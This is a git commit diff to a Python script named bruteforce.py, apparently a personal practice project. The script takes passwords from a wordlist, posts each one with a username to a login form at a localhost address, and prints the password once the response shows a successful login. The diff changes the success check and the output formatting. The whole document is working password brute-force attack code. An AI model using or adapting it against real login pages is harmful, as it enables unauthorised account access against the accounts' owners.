1564a9a6705dcbca0578edd429f9cbe87a58a2b1
GiovanniMatos <giovannyafonso23@gmail.com>
2023-09-12 08:57:28 -0300

    commit

--- bruteforce/bruteforce.py
+++ bruteforce/bruteforce.py
@@ -14,13 +14,15 @@ for senha in wordlist:
         "nome": usuario,
         "password": senha}
     
+    os.system("clear || cls")
+    print(f"Testando - {senha}")
+    
     response = requests.post("http://127.0.0.1:5000/login", data=login_data).text
-    if "Usuário Logado" not in response:
+    if "Adicionar layer" not in response:
         os.system("clear || cls")
-        print(f"Testando - {senha}")
-        #time.sleep(0.1)
+        print('Senha não encontrada \n')
     else:
         os.system("clear || cls")
-        print("="*40,"\n")
-        print(f"\033[32m[+]\033[0;0m {host} \n\033[32m[+]\033[0;0m Senha encontrada - \033[32m{senha}\033[0;0m")
+        print(f"\n\033[32m[+]\033[0;0m {host}")
+        print(f"\033[32m[+]\033[0;0m Usuário - \033[32m{usuario}\033[0;0m \n\033[32m[+]\033[0;0m Senha encontrada - \033[32m{senha}\033[0;0m")
         print("\n\n\n")
